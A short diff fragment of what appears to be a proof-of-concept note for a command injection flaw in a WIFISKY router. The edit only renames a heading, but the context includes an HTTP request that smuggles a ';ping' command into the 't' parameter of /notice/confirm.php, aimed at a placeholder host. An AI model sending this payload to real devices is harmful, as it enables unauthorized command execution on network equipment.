@@ -6,7 +6,7 @@
 title="WIFISKY 7层流控路由器"
 ```
 
-## poc
+## POC
 ```
 GET /notice/confirm.php?t=;ping%20xxxx.com HTTP/1.1
 Host: 
